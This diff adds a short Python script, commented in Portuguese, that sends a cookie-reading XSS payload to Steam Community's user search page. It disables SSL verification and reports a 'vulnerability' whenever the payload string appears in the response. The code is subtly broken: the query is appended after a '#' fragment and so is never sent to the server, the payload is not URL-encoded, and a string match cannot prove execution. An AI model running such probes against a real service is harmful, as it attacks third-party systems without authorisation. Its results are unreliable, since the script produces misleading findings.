@@ -1,0 +1,26 @@
+import requests
+
+# URL do site que você deseja testar
+url = "https://steamcommunity.com/search/users/#text=NAME"
+
+# Parâmetro do campo de entrada de texto vulnerável
+param = "eval(event.view.name)"
+
+# Payload malicioso
+payload = "window.name =console.log('This is console logging cookie: ' + document.cookie); alert('This is alert dialog with cookie: ' + document.cookie);"
+
+
+# Construindo a URL com o payload injetado
+target_url = url + "?" + param + "=" + payload
+
+# Desativando a verificação SSL para evitar erros relacionados ao OpenSSL
+requests.packages.urllib3.disable_warnings()
+
+# Enviando a requisição GET
+response = requests.get(target_url, verify=False)
+
+# Verificando se o payload foi executado
+if payload in response.text:
+    print("Vulnerabilidade de XSS detectada!")
+else:
+    print("Não foi detectada vulnerabilidade de XSS.")
